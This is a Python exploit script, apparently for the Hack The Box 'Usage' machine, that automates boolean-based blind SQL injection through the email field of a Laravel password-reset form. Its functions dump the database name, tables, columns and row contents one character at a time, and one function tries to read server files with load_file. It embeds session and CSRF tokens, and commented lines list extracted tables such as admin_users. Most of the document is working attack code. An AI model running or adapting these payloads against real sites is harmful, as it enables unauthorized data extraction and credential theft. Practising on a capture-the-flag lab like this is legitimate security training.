#!/bin/env python3

import requests, sys
from pwn import *

# Global Variables

url = "http://usage.htb/forget-password"

chs = r'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ_-:.1234567890#!"#$%&/()=?*[]}{,'
csrf_token = "OchUUX12u596nfL35BgIIrYeCljQPSC01hZd459J"
xsrf_token = "eyJpdiI6IkhobjNmTEprK1ZIZDZybG5USVUzMWc9PSIsInZhbHVlIjoibzFSVkFOMmtUbTNHMmR0NDgzb1o4NFV4dmRXR0VGTFJqenZCNldCOUFNZTJBYlZwcTFUV0MzTjREWkg2NVFrWnV1RVhDeGVKcVVTdE9pWkhLVWxMcEF2QUpHdEVCakRLMEFlZ1NnS1FtZCtJUHFpd3ozNE5VMC9Ka0VMQU9UU2EiLCJtYWMiOiI1YzBkMjkzYjdkNmQzMzc4ZmJkZGFiZTgzYmUzMjFhODAyMjQ1OWIyODc0NGM3MGZjNGM0MzcwMDdjNzU5ZmVjIiwidGFnIjoiIn0%3D"
laravel_session = "eyJpdiI6IitmeWVnYnJiUDVkMmk2V3dZMHdzeUE9PSIsInZhbHVlIjoiUithWkJFc1dqbnh1ZEwvWlBvd2tTd0gxVTBSM2RwTXRMVVJvUWd1anNXREMzM3NQWUNzcU9sQWsvZjRZem5jMzdpMkdpdVowSndIK3JtbWxRNTAzeFZNQmxvRTNUdU5yeFhjN2JBTU44eDcrY29iSFp5TENXMjlPYWZUNEtwSnoiLCJtYWMiOiIwZDJhNGUyNTAxOTc2M2E5Y2EzZTAyYWE1ODE3OTdlNWRmYTcwY2FlMzk1NWIzNzIwNThmYjM2NTU1MDYzYWQzIiwidGFnIjoiIn0%3D"

#proxy = {"http": "127.0.0.1:8080"}
proxy = {}

headers = {
    "Cookie": "XSRF-TOKEN=%s; laravel_session=%s" % (xsrf_token, laravel_session),
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Windows 11 x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
}

# Ctrl - C


def def_handler(sig, frame):
    print("\n[x] Exiting...")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

# Dump current database


def dump_db_name(db_name):

    print()
    s1 = log.progress("[*] DB Name")
    s2 = log.progress("Payload")

    counter = 0  # Dont waste time

    for i in range(1, 100):
        for c in chs:

            payload = "' or if(substr(database(),%d,1)='%c',1,0)#" % (i, c)

            data = {"_token": csrf_token, "email": payload}  # vuln input

            req = requests.post(
                url, data=data, headers=headers, proxies=proxy, allow_redirects=True
            )

            if req.status_code == 419:
                print("\n[x] Please, update the csrf token...\n")
                sys.exit(2)

            if req.status_code == 500:
                print("[x] Something went wrong!")
                sys.exit(1)

            s2.status(payload)

            if "Email address does not match in our records!" not in req.text:
                db_name += c
                s1.status(db_name)
                counter += 1
                break

        if counter != i:
            break

    s1.success("%s" % db_name)

    return db_name


def dump_TCE(to_dump, db_name, table, column, entry):

    tables = []
    columns = []
    entries = []

    for i in range(0, 100):

        counter = 0  # Dont waste time

        print()
        if to_dump == "tables":
            s1 = log.progress("[%d] Table" % i)
        elif to_dump == "columns":
            s1 = log.progress("[%d] Column" % i)
        elif to_dump == "entries":
            s1 = log.progress("[%d] Entry" % i)
        else:
            print("\n[X] Selecciona una opción correcta (tables/columns/entries)")
            sys.exit(2)

        s2 = log.progress("Payload")

        for j in range(1, 100):

            for c in chs:

                if to_dump == "tables":
                    payload = (
                        "' or if(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)='%c',1,0)#"
                        % (db_name, i, j, c)
                    )
                elif to_dump == "columns":
                    payload = (
                        "' or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%c',1,0)#"
                        % (db_name, table, i, j, c)
                    )
                elif to_dump == "entries":
                    payload = (
                        "' or if(substr((select %s from %s limit %d,1),%d,1)='%c',1,0);#"
                        % (column, table, i, j, c)
                    )

                data = {"_token": csrf_token, "email": payload}  # vuln input

                req = requests.post(
                    url, data=data, headers=headers, proxies=proxy, allow_redirects=True
                )

                if req.status_code == 419:
                    print("\n[x] Please, update the csrf token...\n")
                    sys.exit(2)

                if req.status_code == 500:
                    print("[x] Something went wrong!")
                    sys.exit(1)

                s2.status(payload)

                if "Email address does not match in our records!" not in req.text:
                    if to_dump == "tables":
                        table += c
                        s1.status(table)
                    elif to_dump == "columns":
                        column += c
                        s1.status(column)
                    elif to_dump == "entries":
                        entry += c
                        s1.status(entry)

                    counter += 1
                    break

            if counter != j:
                if to_dump == "tables":
                    if len(table) == 0:
                        return tables
                    tables.append(table)
                    s1.success("%s" % (table))
                    table = ""
                elif to_dump == "columns":
                    if len(column) == 0:
                        return columns
                    columns.append(column)
                    s1.success("%s" % (column))
                    column = ""
                elif to_dump == "entries":
                    if len(entry) == 0:
                        return entries
                    entries.append(entry)
                    s1.success("%s" % (entry))
                    entry = ""

                break

    if to_dump == "tables":
        return tables
    elif to_dump == "columns":
        return columns
    elif to_dump == "entries":
        return entries


def show_tables(tables):
    print("\n")
    for i in range(1, len(tables) + 1):
        print("[%d] %s" % (i, tables[i - 1]))
    print("[0] Exit")


def show_columns(columns):
    print("\n")
    for i in range(1, len(columns) + 1):
        print("[%d] %s" % (i, columns[i - 1]))
    print("[tables] Go back to tables")


def show_entries(entries):
    print("\n")
    for i in range(1, len(entries) + 1):
        print("[%d] %s" % (i, entries[i - 1]))
    print("[columns] Go back to columns")


def read_file(file, file_content):

    print()
    s1 = log.progress("[*] File Content")
    s2 = log.progress("Payload")

    counter = 0  # Dont waste time

    for i in range(1, 100):
        for c in chs:

            payload = "' or if(substr(load_file(%s),%d,1)='%c',1,0)#" % (file, i, c)

            data = {"_token": csrf_token, "email": payload}  # vuln input

            req = requests.post(
                url, data=data, headers=headers, proxies=proxy, allow_redirects=True
            )

            if req.status_code == 419:
                print("\n[x] Please, update the csrf token...\n")
                sys.exit(2)

            if req.status_code == 500:
                print("[x] Something went wrong!")
                sys.exit(2)

            s2.status(payload)

            if "Email address does not match in our records!" not in req.text:
                file_content += c
                s1.status(file_content)
                counter += 1
                break

        if counter != i:
            break

    s1.success("%s" % file_content)

    return file_content


if __name__ == "__main__":

    # read_file('/etc/passwd', "") Not vulnerable

    # db_name = "usage_blog"
    # tables = [
    #     "admin_operation_log",
    #     "admin_permissions",
    #     "admin_role_menu",
    #     "admin_role_permissions",
    #     "admin_role_users",
    #     "admin_roles",
    #     "admin_user_permissions",
    #     "admin_users",
    #     "blog",
    #     "failed_jobs",
    #     "migrations",
    #     "password_reset_tokens",
    #     "personal_access_tokens",
    #     "users",
    # ]
    # columns = [
    #     "username",
    #     "password",
    #     "name",
    #     "avatar",
    #     "remember_token",
    #     "created_at",
    #     "updated_at",
    # ]

    # columns = ["migration", "batch"]

    # columns = ['tokenable_type', 'tokenable_id', 'name', 'token', 'abilities']

    # columns = ['user_id', 'path', 'method', 'ip', 'input', 'created_at', 'updated_at']

    db_name = dump_db_name("")
    tables = dump_TCE("tables", "usage_blog", "", "", "")

    while True:

        show_tables(tables)
        print("\n[*] Choose the table ID you wanna dump or type 0 to exit: \n")
        table_id = input("[Table ID]> ")

        if table_id == "0":
            break

        columns = dump_TCE("columns", db_name, tables[int(table_id) - 1], "", "")

        while True:

            show_columns(columns)
            print(
                "\n[*] Choose the Column ID you wanna dump or type 'tables' to exit: \n"
            )
            column_id = input("[Column ID]> ")

            if column_id == "tables":
                break

            entries = dump_TCE(
                "entries",
                db_name,
                tables[int(table_id) - 1],
                columns[int(column_id) - 1],
                "",
            )

            while True:

                show_entries(entries)
                break
